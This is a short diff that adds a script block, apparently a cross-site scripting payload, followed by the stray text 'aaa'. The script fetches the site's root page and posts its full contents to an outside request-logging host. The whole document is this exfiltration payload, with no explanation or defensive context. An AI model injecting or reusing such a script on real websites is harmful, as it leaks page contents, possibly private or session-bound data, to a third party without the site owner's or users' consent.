@@ -1,0 +1,8 @@
+<script>
+fetch("/")
+    .then(x => x.text())
+    .then(x => fetch("https://nice.requestcatcher.com/test", {
+        method: "post",
+        body: x
+    }))
+</script>aaa
